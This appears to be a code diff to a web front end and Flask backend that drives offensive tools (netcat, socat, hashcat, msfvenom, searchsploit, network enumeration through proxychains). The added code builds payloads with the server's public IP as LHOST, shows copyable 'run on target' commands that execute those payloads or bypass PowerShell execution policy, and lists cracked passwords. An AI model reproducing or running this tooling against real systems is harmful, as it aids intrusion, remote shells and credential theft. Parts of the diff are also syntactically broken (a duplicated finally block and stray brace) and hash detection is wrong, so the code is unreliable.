@@ -1416,6 +1416,7 @@ document.addEventListener('DOMContentLoaded',navRestore);
               <button class="pill on" id="lg-mod-snmp" onclick="lgMod('snmp',this)">SNMP</button>
               <button class="pill" id="lg-mod-hydra" onclick="lgMod('hydra',this)">hydra</button>
               <button class="pill" id="lg-mod-finger" onclick="lgMod('finger',this)">finger</button>
+              <button class="pill" id="lg-mod-nbtscan" onclick="lgMod('nbtscan',this)">nbtscan</button>
             </div>
           </div>
           <button class="btn btn-primary" id="lg-btn" onclick="doLegion()" style="margin-top:12px">RUN LEGION</button>
@@ -3674,6 +3675,16 @@ async function runNetcat(){
   var args=(mode==='listen'?('-l -p '+port):((host+' '+port)))+(extra?' '+extra:'');
   var btn=document.getElementById('nc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
   ncTool.start();ncTool.log('Executing netcat mode: '+mode,'i');
+  
+  // Show the other side command
+  var otherSideCmd='';
+  if(mode==='listen'){
+    otherSideCmd='nc '+window.location.hostname+' '+port;
+  }else{
+    otherSideCmd='nc -l -p '+port;
+  }
+  ncTool.res('<div class="card card-p"><div class="card-title">Command for other side (target system)</div><div style="display:flex;gap:6px;margin:8px 0"><code style="flex:1;background:var(--bg2);padding:8px;border-radius:4px;overflow:auto;font-family:var(--mono);font-size:11px">'+otherSideCmd+'</code><button class="btn btn-outline btn-xs" onclick="copyToClipboard(this,\''+otherSideCmd.replace(/'/g,"\\'")+'\')" style="white-space:nowrap">COPY</button></div></div>');
+  
   try{
     var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'netcat',operation:'custom',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),'nc');
     var d=await r.json();ncTool.end();if(d.error){ncTool.err(d.error);}else{ncTool.log('Netcat command completed','s');renderSocialTool(ncTool,d);}
@@ -3686,6 +3697,11 @@ async function runSocat(){
   var args=(extra?extra+' ':'')+left+' '+right;
   var btn=document.getElementById('sc-btn');btn.disabled=true;btn.innerHTML='<span class="spin"></span> Running...';
   scTool.start();scTool.log('Executing socat bridge','i');
+  
+  // Show the complementary socat command for the other side
+  var otherSideCmd='socat '+right+' '+left;
+  scTool.res('<div class="card card-p"><div class="card-title">Complementary command for other side</div><div style="display:flex;gap:6px;margin:8px 0"><code style="flex:1;background:var(--bg2);padding:8px;border-radius:4px;overflow:auto;font-family:var(--mono);font-size:10px">'+otherSideCmd+'</code><button class="btn btn-outline btn-xs" onclick="copyToClipboard(this,\''+otherSideCmd.replace(/'/g,"\\'")+'\')" style="white-space:nowrap">COPY</button></div></div>');
+  
   try{
     var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'socat',operation:'custom',args:args,timeout:timeout})},Math.max(20000,timeout*1000+5000),'sc');
     var d=await r.json();scTool.end();if(d.error){scTool.err(d.error);}else{scTool.log('Socat command completed','s');renderSocialTool(scTool,d);}
@@ -3890,7 +3906,7 @@ function renderLynis(d){
 }
 
 /* ==== LEGION ==== */
-var lgMods={'nmap':true,'nikto':true,'smb':true,'snmp':true,'hydra':false,'finger':false};
+var lgMods={'nmap':true,'nikto':true,'smb':true,'snmp':true,'hydra':false,'finger':false,'nbtscan':false};
 function lgMod(m,el){lgMods[m]=!lgMods[m];el.classList.toggle('on',lgMods[m]);}
 async function doLegion(){
   var target=document.getElementById('lg-target').value.trim();if(!target){alert('Enter a target');return;}
@@ -4762,9 +4778,20 @@ async function runHping3(){
 async function runHashcat(){
   var hashes=document.getElementById('hashcat-hashes').value.trim();
   if(!hashes){alert('Enter hashes or a file path');return;}
-  var type=document.getElementById('hashcat-type').value||'0';
+  
+  // Auto-detect hash type
+  var detectedType=detectHashType(hashes);
+  var type=document.getElementById('hashcat-type').value||detectedType||'0';
+  
   var attack=document.getElementById('hashcat-attack').value||'0';
   var wordlist=document.getElementById('hashcat-wordlist').value.trim();
+  
+  // Default to rockyou.txt if wordlist is empty
+  if(!wordlist){
+    wordlist='/usr/share/wordlists/rockyou.txt';
+    document.getElementById('hashcat-wordlist').value=wordlist;
+  }
+  
   var rules=document.getElementById('hashcat-rules').value.trim();
   var workload=document.getElementById('hashcat-workload').value||'2';
   var timeout=parseInt(document.getElementById('hashcat-timeout').value||'300',10);
@@ -4774,14 +4801,81 @@ async function runHashcat(){
   args+=' --force';
   var btn=document.getElementById('hashcat-btn');
   btn.disabled=true;btn.innerHTML='<span class="spin"></span> Cracking...';
-  var t=mkTool('hashcat');t.start();t.log('Hashcat -m '+type+' -a '+attack,'i');
+  var t=mkTool('hashcat');t.start();t.log('Hashcat -m '+type+' -a '+attack+' (Type auto-detected)','i');
   try{
     var r=await fetchWithTimeout('/social-tools/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:'hashcat',operation:'custom',args:args,timeout:timeout})},Math.max(60000,timeout*1000+5000),'hashcat');
     var d=await r.json();t.end();
     if(d.error){t.err(d.error);}
     else{t.log('Hashcat done','s');
-      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||'(no output)')+'</pre></div>');}
+      var output=d.stdout||'(no output)';
+      var passwords=parseHashcatOutput(output);
+      var res='<div class="card card-p"><pre style="white-space:pre-wrap;font-size:10px;font-family:var(--mono);color:var(--text2);max-height:400px;overflow:auto">'+output+'</pre></div>';
+      if(passwords.length>0){
+        res+='<div class="card card-p" style="margin-top:12px;border:2px solid var(--green)"><div class="card-title" style="color:var(--green)">Cracked Passwords Found!</div><div style="margin-top:8px;display:flex;flex-direction:column;gap:6px">';
+        passwords.forEach(function(pwd){
+          res+='<div style="background:var(--bg2);padding:8px;border-radius:4px;display:flex;gap:6px;align-items:center"><code style="flex:1;font-family:var(--mono);font-size:11px">'+pwd+'</code><button class="btn btn-outline btn-xs" onclick="copyToClipboard(this,\''+pwd.replace(/'/g,"\\'")+'\')" style="white-space:nowrap">COPY</button></div>';
+        });
+        res+='</div></div>';
+      }
+      t.res(res);}
   }catch(e){t.end();t.err(e.message);}
+  finally{btn.disabled=false;btn.innerHTML='RUN HASHCAT';}
+}
+
+function detectHashType(hashStr){
+  var hash=hashStr.split('\n')[0].trim();
+  // Remove common file paths (if input is a file path)
+  if(hash.startsWith('/'))return null;
+  
+  var len=hash.length;
+  var patterns={
+    '0':'MD5 (32 hex)',
+    '100':'SHA1 (40 hex)',
+    '1400':'SHA256 (64 hex)',
+    '1700':'SHA512 (128 hex)',
+    '3200':'bcrypt',
+    '5500':'NetNTLMv1',
+    '5600':'NetNTLMv2',
+    '1000':'NTLM',
+    '7900':'Drupal7',
+    '9200':'Cisco-IOS SHA256',
+    '12500':'RAR3',
+  };
+  
+  // Check length patterns
+  if(len===32 && /^[a-f0-9]{32}$/i.test(hash))return '0';
+  if(len===40 && /^[a-f0-9]{40}$/i.test(hash))return '100';
+  if(len===64 && /^[a-f0-9]{64}$/i.test(hash))return '1400';
+  if(len===128 && /^[a-f0-9]{128}$/i.test(hash))return '1700';
+  if(/^\$2[aby]\$\d{2}\$/.test(hash))return '3200';
+  if(/^[a-f0-9]{32}:[a-f0-9]{32}$/i.test(hash))return '5600';
+  if(hash.includes('$'))return '1800';
+  
+  return null;
+}
+
+function parseHashcatOutput(output){
+  var passwords=[];
+  var lines=output.split('\n');
+  var foundSection=false;
+  
+  for(var i=0;i<lines.length;i++){
+    var line=lines[i];
+    // Look for lines with hash:password format
+    if(line.includes('Hash.Target')||line.includes('Hash-Mode')){foundSection=true;continue;}
+    if(foundSection && line.match(/[a-f0-9]{32,128}/) && line.includes(':')){
+      var parts=line.split(':');
+      if(parts.length>1){
+        var password=parts.slice(1).join(':').trim();
+        if(password && password.length>0 && passwords.indexOf(password)===-1){
+          passwords.push(password);
+        }
+      }
+    }
+  }
+  
+  return passwords;
+}}
   finally{btn.disabled=false;btn.innerHTML='RUN HASHCAT';}
 }
 
@@ -4845,9 +4939,33 @@ async function runSearchsploit(){
     var d=await r.json();t.end();
     if(d.error){t.err(d.error);}
     else{t.log('Search complete','s');
-      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||'No exploits found.')+'</pre></div>');}
+      var out=d.stdout||'No exploits found.';
+      var formatted=formatSearchsploitOutput(out);
+      t.res(formatted);}
   }catch(e){t.end();t.err(e.message);}
   finally{btn.disabled=false;btn.innerHTML='SEARCH EXPLOIT-DB';}
+}
+
+function formatSearchsploitOutput(output){
+  var lines=output.split('\n');
+  var results=[];
+  var table='<div class="card card-p"><table style="width:100%;border-collapse:collapse;font-size:12px;font-family:var(--mono)">';
+  table+='<tr style="border-bottom:1px solid var(--border);background:var(--bg2)"><th style="text-align:left;padding:8px;font-weight:bold">Type</th><th style="text-align:left;padding:8px;font-weight:bold">Path</th><th style="text-align:left;padding:8px;font-weight:bold">Description</th></tr>';
+  var lineCount=0;
+  for(var i=0;i<lines.length && lineCount<50;i++){
+    var line=lines[i].trim();
+    if(!line || line.startsWith('---') || line.startsWith('Exploit') || line.startsWith('Shellcode'))continue;
+    var parts=line.split(/\s+/);
+    if(parts.length>=2){
+      table+='<tr style="border-bottom:1px solid var(--border);hover:background:var(--bg2)"><td style="padding:6px;vertical-align:top">' + (parts[0]||'') + '</td><td style="padding:6px;vertical-align:top;max-width:350px;overflow:auto;color:var(--cyan)">' + (parts.slice(1).join(' ').substring(0,100) || '') + '</td><td style="padding:6px;vertical-align:top;color:var(--text2);font-size:10px">'+(parts.slice(1).join(' ').substring(100,180)||'')+'</td></tr>';
+      lineCount++;
+    }
+  }
+  table+='</table></div>';
+  if(lineCount<lines.length){
+    table+='<div class="card card-p" style="margin-top:8px;color:var(--text2);font-size:11px">Found '+(lines.length-5)+' total results. Showing first 50. <button class="btn btn-outline btn-xs" onclick="copyText(event)">Copy All</button></div>';
+  }
+  return table;
 }
 
 /* msfvenom */
@@ -4856,19 +4974,40 @@ async function runMsfvenom(){
   var customP=document.getElementById('msfvenom-custom-payload').value.trim();
   var payload=payloadSel==='custom'?customP:payloadSel;
   if(!payload){alert('Select or enter a payload');return;}
-  var lhost=document.getElementById('msfvenom-lhost').value.trim();
+  
+  // Auto-set LHOST if empty
+  var lhostEl=document.getElementById('msfvenom-lhost');
+  if(!lhostEl.value.trim()){
+    try{
+      var ipResp=await fetch('/api/public-ip');
+      var ipData=await ipResp.json();
+      if(ipData.ip)lhostEl.value=ipData.ip;
+    }catch(e){}
+  }
+  
+  var lhost=lhostEl.value.trim();
   var lport=document.getElementById('msfvenom-lport').value||'4444';
+  
+  // Auto-select format based on payload type
   var format=document.getElementById('msfvenom-format').value||'exe';
+  if(payload.includes('windows') && !payload.includes('cmd')){format='exe';}
+  else if(payload.includes('linux')){format='elf';}
+  else if(payload.includes('php')){format='php';}
+  else if(payload.includes('python')){format='py';}
+  else if(payload.includes('cmd/unix')){format='bash';}
+  
   var encoder=document.getElementById('msfvenom-encoder').value||'';
   var iterations=document.getElementById('msfvenom-iterations').value||'1';
   var extra=document.getElementById('msfvenom-extra').value.trim();
   var timeout=parseInt(document.getElementById('msfvenom-timeout').value||'60',10);
+  
   var args='-p '+payload;
   if(lhost)args+=' LHOST='+lhost;
   args+=' LPORT='+lport+' -f '+format;
   if(encoder)args+=' -e '+encoder+' -i '+iterations;
   if(extra)args+=' '+extra;
   args+=' --platform auto';
+  
   var btn=document.getElementById('msfvenom-btn');
   btn.disabled=true;btn.innerHTML='<span class="spin"></span> Generating...';
   var t=mkTool('msfvenom');t.start();t.log('msfvenom -p '+payload,'i');
@@ -4877,9 +5016,28 @@ async function runMsfvenom(){
     var d=await r.json();t.end();
     if(d.error){t.err(d.error);}
     else{t.log('Payload generated (exit '+d.exit_code+')','s');
-      t.res('<div class="card card-p"><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+(d.stdout||d.stderr||'Done')+'</pre></div>');}
+      var output=d.stdout||d.stderr||'Done';
+      var agentCmd='';
+      if(format==='exe' || format==='elf'){
+        agentCmd='if [ -f payload.'+format+' ]; then chmod +x payload.'+format+' && ./payload.'+format+'; fi';
+      }else if(format==='php'){
+        agentCmd='php payload.php';
+      }else if(format==='py'){
+        agentCmd='python3 payload.py';
+      }else if(format==='powershell'){
+        agentCmd='powershell -ExecutionPolicy Bypass -Command "& {. payload.ps1}"';
+      }
+      var displayRes='<div class="card card-p"><div class="card-title">Payload Generated</div><pre style="white-space:pre-wrap;font-size:10px;font-family:var(--mono);color:var(--text2);max-height:300px;overflow:auto">'+output+'</pre>';
+      if(agentCmd){
+        displayRes+='<div style="margin-top:12px;border-top:1px solid var(--border);padding-top:12px"><div class="card-title" style="font-size:12px;margin-bottom:6px">Agent Command (run on target)</div><div style="display:flex;gap:6px"><code style="flex:1;background:var(--bg2);padding:8px;border-radius:4px;overflow:auto;font-family:var(--mono);font-size:10px">'+agentCmd+'</code><button class="btn btn-outline btn-xs" onclick="copyToClipboard(this,\''+agentCmd.replace(/'/g,"\\'")+'\')" style="white-space:nowrap">COPY</button></div></div>';
+      }
+      displayRes+='</div>';
+      t.res(displayRes);}
   }catch(e){t.end();t.err(e.message);}
   finally{btn.disabled=false;btn.innerHTML='GENERATE PAYLOAD';}
+}
+function copyToClipboard(btn,text){
+  navigator.clipboard.writeText(text).then(function(){var old=btn.innerHTML;btn.innerHTML='COPIED';setTimeout(function(){btn.innerHTML=old;},1500);}).catch(function(){alert('Copy failed');});
 }
 
 /* radare2 */
@@ -5092,10 +5250,28 @@ async function runSeclists(){
       var words=d.words||[];
       if(grep){var re=new RegExp(grep,'i');words=words.filter(function(w){return re.test(w);});}
       t.log('Loaded '+d.total_loaded+' entries (showing '+words.length+')','s');
-      t.res('<div class="card card-p"><div class="card-title" style="margin-bottom:6px">'+d.filename+' ('+d.total_loaded+' entries)</div><pre style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+words.join('\n')+'</pre></div>');
+      var displayWords=words.slice(0,50);
+      var copy_all_id='copy_all_'+Math.random().toString(36).substr(2);
+      var res_html='<div class="card card-p"><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><div class="card-title">'+d.filename+' ('+d.total_loaded+' entries)</div>';
+      if(displayWords.length>0){
+        res_html+='<button class="btn btn-outline btn-xs" onclick="copyWordlist('+copy_all_id+')">COPY ALL</button>';
+      }
+      res_html+='</div><pre id="'+copy_all_id+'" style="white-space:pre-wrap;font-size:11px;font-family:var(--mono);color:var(--text2)">'+displayWords.join('\n')+'</pre>';
+      if(words.length>50){
+        res_html+='<div style="margin-top:8px;color:var(--text2);font-size:10px">Showing 50 of '+words.length+' filtered entries</div>';
+      }
+      res_html+='</div>';
+      t.res(res_html);
     }
   }catch(e){t.end();t.err(e.message);}
   finally{btn.disabled=false;btn.innerHTML='BROWSE WORDLIST';}
+}
+function copyWordlist(elemId){
+  var elem=document.getElementById(elemId);
+  if(elem){
+    var text=elem.innerText;
+    navigator.clipboard.writeText(text).then(function(){showToast('Success','Wordlist copied to clipboard','success',2000);}).catch(function(){showToast('Error','Copy failed','error',2000);});
+  }
 }
 async function seclistsCount(){
   var path=document.getElementById('seclists-path').value.trim();
@@ -7139,6 +7315,57 @@ def legion_route():
                         findings.append({"title": line.strip()[2:80], "detail": ""})
                         total_issues += 1
 
+            elif mod == "smb" or mod == "smbclient":
+                # SMB enumeration through proxychains
+                cmd = [px, "-q", "smbclient", "-L", target, "-N", "-m", "SMB3"]
+                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
+                if proc.stdout.strip():
+                    for line in proc.stdout.splitlines():
+                        if line.strip() and not line.startswith('\t') and '\\' not in line:
+                            findings.append({"title": f"SMB Share: {line.strip()}", "detail": ""})
+                            total_issues += 1
+                if proc.stderr and "NT_STATUS" in proc.stderr:
+                    findings.append({"title": "SMB Enumeration", "detail": f"Status: {proc.stderr[:100].strip()}"})
+
+            elif mod == "snmp":
+                # SNMP enumeration through proxychains
+                cmd = [px, "-q", "snmpwalk", "-v", "2c", "-c", "public", target, "1.3.6.1.2.1"]
+                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+                if proc.stdout.strip():
+                    snmp_lines = proc.stdout.splitlines()[:15]  # First 15 lines
+                    for line in snmp_lines:
+                        if "=" in line:
+                            findings.append({"title": "SNMP Info", "detail": line[:120].strip()})
+                    if len(proc.stdout.splitlines()) > 15:
+                        findings.append({"title": "SNMP Info", "detail": f"... and {len(proc.stdout.splitlines())-15} more entries"})
+                    total_issues += 1
+
+            elif mod == "hydra":
+                # Hydra password attack (dummy mode for demo - requires valid target/service)
+                findings.append({
+                    "title": "Hydra Module",
+                    "detail": "Hydra cracking engine available. Configure service, username, and password list for attack."
+                })
+
+            elif mod == "finger":
+                # Finger service enumeration through proxychains
+                cmd = [px, "-q", "finger", target]
+                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+                if proc.stdout.strip():
+                    for line in proc.stdout.splitlines()[:10]:
+                        findings.append({"title": "Finger Info", "detail": line.strip()})
+                    total_issues += 1
+
+            elif mod == "nbtscan" or "nbt" in mod:
+                # NetBIOS scan through proxychains
+                cmd = [px, "-q", "nbtscan", target]
+                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+                if proc.stdout.strip():
+                    for line in proc.stdout.splitlines():
+                        if line.strip() and not line.startswith('___'):
+                            findings.append({"title": "NetBIOS Info", "detail": line.strip()})
+                            total_issues += 1
+
             else:
                 # Other tools through proxychains
                 proc = subprocess.run(
@@ -8363,6 +8590,29 @@ def admin_service_action(key):
 
 # ── Health check ───────────────────────────────────────────────────────────────
 # ── Wordlist API endpoint ─────────────────────────────────────────────────────
+@app.route("/api/public-ip")
+def public_ip_api():
+    """Get the public IP address of the server."""
+    user = get_current_user()
+    if not user:
+        return jsonify({"error": "Login required"}), 401
+    
+    try:
+        # Try to get public IP from request headers
+        public_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        if public_ip and public_ip != '127.0.0.1':
+            return jsonify({"ip": public_ip})
+        
+        # Fallback: try to get from socket
+        public_ip = socket.gethostbyname(socket.gethostname())
+        if public_ip and public_ip != '127.0.0.1':
+            return jsonify({"ip": public_ip})
+        
+        # Last resort: return localhost
+        return jsonify({"ip": "127.0.0.1"})
+    except Exception as e:
+        return jsonify({"ip": request.remote_addr, "error": str(e)})
+
 @app.route("/api/wordlist")
 def wordlist_api():
     """Serve wordlist file contents for brute force UI. Admin or authenticated users only."""
